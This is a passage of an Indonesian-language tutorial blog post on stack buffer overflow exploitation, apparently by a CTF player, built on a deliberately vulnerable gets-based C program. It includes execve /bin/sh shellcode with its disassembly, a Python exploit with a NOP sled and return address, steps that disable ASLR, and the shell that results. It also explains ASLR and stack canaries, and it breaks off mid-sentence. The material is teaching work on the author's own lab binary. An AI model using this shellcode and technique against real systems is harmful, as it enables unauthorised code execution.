class="cpp string">"%p\n"</code><code class="cpp plain">,buf);</code></div><div class="line number8 index7 alt1"><code class="cpp plain">}</code></div><div class="line number9 index8 alt2"><code class="cpp color1 bold">int</code> <code class="cpp plain">main(</code><code class="cpp color1 bold">int</code> <code class="cpp plain">argc, </code><code class="cpp color1 bold">char</code><code class="cpp plain">** argv){</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">vuln();</code></div><div class="line number11 index10 alt2"><code class="cpp plain">}</code></div></div></td></tr></tbody></table></div></div>
<div><div id="highlighter_231977" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gcc -m32 -o bof2 variable-overflow.c -fno-stack-protector -z execstack</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-7" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Contoh
 kode diatas, sedikit berbeda dari sebelumnya, program diatas menerima 
input dengan fungsi gets. fungsi gets tidak aman, karena seberpapun 
panjang inputan kita, semuanya akan dikopi ke buffer.</p>
<p data-adtags-visited="true">Disini tidak ada bagian kode program yg 
memanggil fungsi system. Jadi kita harus menggunakan shellcode yg bisa 
memanggil "/bin/sh" dengan syscall execve. disini saya sudah mempunyai 
shellcode yang saya ambil dari internet. Nantinya eip akan diarahkan ke 
alamat shellcode. Untuk yg belum terlalu memahami tentang shellcode, 
mungkin nanti saya akan khusus membahas tentang shellcode, karena 
bahasan shellcode bukan bahasan yg simple. tapi untuk bagian ini, anggap
 saja shellcode adalah data, dimana data itu adalah kode2 assembly dalam
 bentuk opcode bahasa mesin dalam bilangan hexa, jika eip kita arahkan 
kealamat shellcode itu, dan program mengeksekusi code2 shellcode, makan 
program akan melakukan sesuai tujuan dan fungsi shellcode itu, dalam hal
 ini shellcode yg kita pilih yaitu shellcode yg bisa memanggil "/bin/sh"
 agar kita mendapatkan shell</p>
<p data-adtags-visited="true">Program diatas, eip bisa kita overwrite pada byte ke-64.</p>
<div><div id="highlighter_790213" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ulimit -c unlimited</code></div><div class="line number2 index1 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ python -c 'print "A"*64+"BBBB"' | ./bof2</code></div><div class="line number3 index2 alt2"><code class="plain plain">Masukkan nama anda : Selamat datang AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</code></div><div class="line number4 index3 alt1"><code class="plain plain">0xffffd30c</code></div><div class="line number5 index4 alt2"><code class="plain plain">Segmentation fault (core dumped)</code></div><div class="line number6 index5 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gdb --core=core -q</code></div><div class="line number7 index6 alt2"><code class="plain plain">[New LWP 3345]</code></div><div class="line number8 index7 alt1"><code class="plain plain">Core was generated by `./bof2'.</code></div><div class="line number9 index8 alt2"><code class="plain plain">Program terminated with signal SIGSEGV, Segmentation fault.</code></div><div class="line number10 index9 alt1"><code class="plain plain">#0&nbsp; 0x42424242 in ?? ()</code></div><div class="line number11 index10 alt2"><code class="plain plain">(gdb) </code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-8" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Kita mempunyai shellcode sebesar 47byte</p>
<div><div id="highlighter_740644" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">shellcode = "\x83\xec\x64jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Kode assembly dari shellcode ini, bisa dilihat dibawah ini.</p>
<div><div id="highlighter_899993" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ python -c 'print "\x83\xec\x64jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"' | ndisasm -u -</code></div><div class="line number2 index1 alt1"><code class="plain plain">00000000&nbsp; 83EC64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub esp,byte +0x64</code></div><div class="line number3 index2 alt2"><code class="plain plain">00000003&nbsp; 6A68&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push byte +0x68</code></div><div class="line number4 index3 alt1"><code class="plain plain">00000005&nbsp; 682F2F2F73&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push dword 0x732f2f2f</code></div><div class="line number5 index4 alt2"><code class="plain plain">0000000A&nbsp; 682F62696E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push dword 0x6e69622f</code></div><div class="line number6 index5 alt1"><code class="plain plain">0000000F&nbsp; 89E3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ebx,esp</code></div><div class="line number7 index6 alt2"><code class="plain plain">00000011&nbsp; 6801010101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push dword 0x1010101</code></div><div class="line number8 index7 alt1"><code class="plain plain">00000016&nbsp; 81342472690101&nbsp;&nbsp;&nbsp; xor dword [esp],0x1016972</code></div><div class="line number9 index8 alt2"><code class="plain plain">0000001D&nbsp; 31C9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ecx,ecx</code></div><div class="line number10 index9 alt1"><code class="plain plain">0000001F&nbsp; 51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push ecx</code></div><div class="line number11 index10 alt2"><code class="plain plain">00000020&nbsp; 6A04&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push byte +0x4</code></div><div class="line number12 index11 alt1"><code class="plain plain">00000022&nbsp; 59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop ecx</code></div><div class="line number13 index12 alt2"><code class="plain plain">00000023&nbsp; 01E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add ecx,esp</code></div><div class="line number14 index13 alt1"><code class="plain plain">00000025&nbsp; 51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push ecx</code></div><div class="line number15 index14 alt2"><code class="plain plain">00000026&nbsp; 89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ecx,esp</code></div><div class="line number16 index15 alt1"><code class="plain plain">00000028&nbsp; 31D2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor edx,edx</code></div><div class="line number17 index16 alt2"><code class="plain plain">0000002A&nbsp; 6A0B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push byte +0xb</code></div><div class="line number18 index17 alt1"><code class="plain plain">0000002C&nbsp; 58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop eax</code></div><div class="line number19 index18 alt2"><code class="plain plain">0000002D&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-9" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Ok, sebelumnya untuk percobaan matikan dulu ASLR, dengan cara.</p>
<div><div id="highlighter_942984" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ sudo sysctl -w kernel.randomize_va_space=0</code></div><div class="line number2 index1 alt1"><code class="plain plain">[sudo] password for ramdhan: </code></div><div class="line number3 index2 alt2"><code class="plain plain">kernel.randomize_va_space = 0</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Ini adalah salah satu proteksi dari buffer
 overflow, proteksi ini akan membuat alamat memory di program itu selalu
 berubah, sehingga menyulitkan kita untuk mengarahkan eip ke lokasi 
shellcode, karena alamat si shellcode selalu berubah, ini akan kita 
bahas lebih lanjut nanti. Pastikan alamat dari variable buf, tidak 
berubah2</p>
<div><div id="highlighter_369941" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ echo "AAAAA" | ./bof2</code></div><div class="line number2 index1 alt1"><code class="plain plain">Masukkan nama anda : Selamat datang AAAAA</code></div><div class="line number3 index2 alt2"><code class="plain plain">0xffffd30c</code></div><div class="line number4 index3 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ echo "AAAAA" | ./bof2</code></div><div class="line number5 index4 alt2"><code class="plain plain">Masukkan nama anda : Selamat datang AAAAA</code></div><div class="line number6 index5 alt1"><code class="plain plain">0xffffd30c</code></div><div class="line number7 index6 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ echo "AAAAA" | ./bof2</code></div><div class="line number8 index7 alt1"><code class="plain plain">Masukkan nama anda : Selamat datang AAAAA</code></div><div class="line number9 index8 alt2"><code class="plain plain">0xffffd30c</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-10" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">buf
 berada di alamat 0xffffd30c, nantinya eip akan kita arahkan kealamat 
ini. Panjang inputan kita adalah 68byte (64byte shellcode + 4byte alamat
 shellcode), kita mempunyai 47byte shellcode. <strong>64 – 47 = 17</strong>,
 masih ada sisa 17byte, sisa 17byte ini kita isi dengan intruksi nop 
dalam bahasa assembly. Intruksi nop mempunyai opcode "0x90" dalam bahasa
 assembly. Kita akan mengisi "0x90" sebanyak 17byte. Jadi payload yg 
kita buat adalah</p>
<div><div id="highlighter_96941" class="syntaxhighlighter  python"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">eip_addr </code><code class="python keyword">=</code> <code class="python string">"\x0c\xd3\xff\xff"</code>&nbsp; <code class="python comments"># 0xffffd30c</code></div><div class="line number2 index1 alt1"><code class="python plain">shellcode </code><code class="python keyword">=</code><code class="python string">"\x83\xec\x64jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"</code></div><div class="line number3 index2 alt2"><code class="python plain">nopsled </code><code class="python keyword">=</code> <code class="python string">"\x90"</code><code class="python keyword">*</code><code class="python value">17</code></div><div class="line number4 index3 alt1"><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python plain">shellcode </code><code class="python keyword">+</code> <code class="python plain">nopsled </code><code class="python keyword">+</code> <code class="python plain">eip_addr</code></div><div class="line number5 index4 alt2"><code class="python functions">print</code> <code class="python plain">pyload</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Kita simpan kode python diatas menjadi <span class="skimlinks-unlinked">exploit.py</span>, dan langsung kita jalankan exploitnya.</p>
<div><div id="highlighter_768598" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ cat exploit.py </code></div><div class="line number2 index1 alt1"><code class="plain plain">eip_addr = "\x0c\xd3\xff\xff"</code></div><div class="line number3 index2 alt2"><code class="plain plain">shellcode ="\x83\xec\x64jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" </code></div><div class="line number4 index3 alt1"><code class="plain plain">nopsled = "\x90"*17</code></div><div class="line number5 index4 alt2"><code class="plain plain">payload = shellcode + nopsled + eip_addr</code></div><div class="line number6 index5 alt1"><code class="plain plain">print payload</code></div><div class="line number7 index6 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ (python exploit.py ; cat -) | ./bof2</code></div><div class="line number8 index7 alt1"><code class="plain plain">Masukkan nama anda : Selamat datang ��djhh///sh/bin��h�4$ri1�QjY�Q��1�j</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">X̀�����������������</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">���</code></div><div class="line number11 index10 alt2"><code class="plain plain">0xffffd30c</code></div><div class="line number12 index11 alt1"><code class="plain plain">whoami</code></div><div class="line number13 index12 alt2"><code class="plain plain">ramdhan</code></div><div class="line number14 index13 alt1"><code class="plain plain">id</code></div><div class="line number15 index14 alt2"><code class="plain plain">uid=1000(ramdhan) gid=1000(ramdhan) groups=1000(ramdhan),27(sudo),143(kvm)</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-11" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Ya, kita sudah mendapatkan akses shell 😀</p>
<h2>Proteksi Stack Buffer Overflow</h2>
<p data-adtags-visited="true">&nbsp;&nbsp;&nbsp;Para developer sistem 
operasi pasti tidak akan membiarkan bug buffer overflow seperti ini, 
dengan bug ini attacker dengan mudah mendapatkan akses shell dan bisa 
menguasai system. Maka dari itu dibuat lah proteksi2 buffer overflow yg 
menyulitkan kita untuk melakukan exploitasi buffer overflow. tapi 
attacker juga tidak mau kalah dengan proteksi2 yg dibuat oleh developer,
 mereka attacker selalu menemukan cara untuk membypassnya. Langsung saja
 proteksi2 stack buffer overflow ini adalah.</p>
<h3>1. ASLR</h3>
<p data-adtags-visited="true">Yang pertama adalah ASLR, ASLR adalah 
singkatan dari Address Space Layout Randomization, merupkan sebuah cara 
untuk membuat tempat di sebuah memori mempunyai alamat yang selalu 
berubah. Hal ini menyulitkan kita jika kita harus jumping ke sebuah 
alamat untuk mengeksekusi shellcode, karena alamat itu selalu berubah. 
ASLR otomatis aktif di sistem linux. Kita juga bisa menonaktifkan aslr 
tersebut. Karena aslr kita sudah dimatikan si bagian sebelumnya, kita 
aktifkan kembali aslrnya dengan cara.</p>
<div><div id="highlighter_648939" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ sudo sysctl -w kernel.randomize_va_space=2</code></div><div class="line number2 index1 alt1"><code class="plain plain">[sudo] password for ramdhan: </code></div><div class="line number3 index2 alt2"><code class="plain plain">kernel.randomize_va_space = 2</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-12" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Untuk mematikan, ganti angka 2 menjadi 0. Sekarang mari kita lihat contoh skrip berikut ini.</p>
<div><div id="highlighter_279741" class="syntaxhighlighter  cpp"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp preprocessor">#include &lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="cpp color1 bold">int</code> <code class="cpp plain">main(</code><code class="cpp keyword bold">void</code><code class="cpp plain">){</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code> <code class="cpp plain">i;</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"Alamat dari i = %p\n"</code><code class="cpp plain">, &amp;i);</code></div><div class="line number6 index5 alt1"><code class="cpp plain">}</code></div></div></td></tr></tbody></table></div></div>
<div><div id="highlighter_607388" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gcc -o ptr ptr.c</code></div><div class="line number2 index1 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./ptr</code></div><div class="line number3 index2 alt2"><code class="plain plain">Alamat dari i = 0x7ffdaa04646c</code></div><div class="line number4 index3 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./ptr</code></div><div class="line number5 index4 alt2"><code class="plain plain">Alamat dari i = 0x7ffcf570ab2c</code></div><div class="line number6 index5 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./ptr</code></div><div class="line number7 index6 alt2"><code class="plain plain">Alamat dari i = 0x7ffe54ae9ffc</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Lihat, alamat dari variable dari i selalu 
berubah. Sekarang coba matikan aslr, dan jalankan kembali progamnya. 
Silahkan lakukan sendiri ya :D.<br>
Untuk membypassnya diperlukan keberuntungan, kadang kita bisa 
membruteforce alamat nya, meleak address, menggunakan teknik yg 
dinamakan ROP. Banyak challenge ctf yg mengaktifkan ASLR di servernya, 
jadi kita harus pintar2 mencari cara agar exploit kita berhasil. Tapi 
saya akan membuat artikel2 tentang itu nanti, untuk saat ini coba 
carilah diinternet cara membypass aslr ini.</p>
<p class="inline-ad-slot" id="inline-ad-13" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Contohnya di [artikel ini] (<a href="https://reversingpwn.wordpress.com/2017/07/02/writeup-pwnable-calc/" rel="nofollow">https://reversingpwn.wordpress.com/2017/07/02/writeup-pwnable-calc/</a>
 "writeup pwanble calc") saya menggunakan teknik ROP untuk membypass 
aslrnya, tentunya saya akan membahas khusus tentang teknik ROP (Return 
Oriented Programming) nanti. Dan juga di [artikel ini] (<a href="https://reversingpwn.wordpress.com/2017/07/05/writeup-pwnable-tw-do_brainfuck/" rel="nofollow">https://reversingpwn.wordpress.com/2017/07/05/writeup-pwnable-tw-do_brainfuck/</a>
 "writeup do_brainfuck") saya meleak address, dan menghitung alamat dari
 libc untuk mendapatkan alamat dari system. Semuanya tergantung pada 
binarynya dan tergantung kita menemukan cara yg terbaik untuk membypass 
ini.</p>
<h3>2. Canaries</h3>
<p data-adtags-visited="true">Canaries bisa disebut dengan Stack Guard merupakan sebuah nilai yg berada di diantara variable lokal dan Saved EBP dan Saved EIP</p>
<div><div id="highlighter_320692" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+--------------+</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; variable&nbsp;&nbsp; |</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp;&nbsp;&nbsp; lokal&nbsp;&nbsp;&nbsp; |</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+--------------+</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; Canaries&nbsp;&nbsp; |</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+--------------+</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; Saved EBP&nbsp; |</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+--------------+</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">|&nbsp;&nbsp; Saved EIP&nbsp; |</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">+--------------+</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-14" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Ketika
 fungsi dipanggil, pertama fungsi menginisialisai canaries dengan 
menyimpan sebuah nilai pada canaries. Diakhir program sebelum return, 
nilai yg berada dicanaries di check, jika nilainya sama dengan nilai 
canaries di awal, program akan berjalan seperti biasa, jika tidak sama 
program akan menganggap bahwa stack overflow sudah terjadi. Kita tidak 
mungkin mengoverwrite Saved EBP dan Saved EIP tanpa mengoverwrite isi 
canaries, kecuali kita mengetahui isi dari nilai canaries tersebut, 
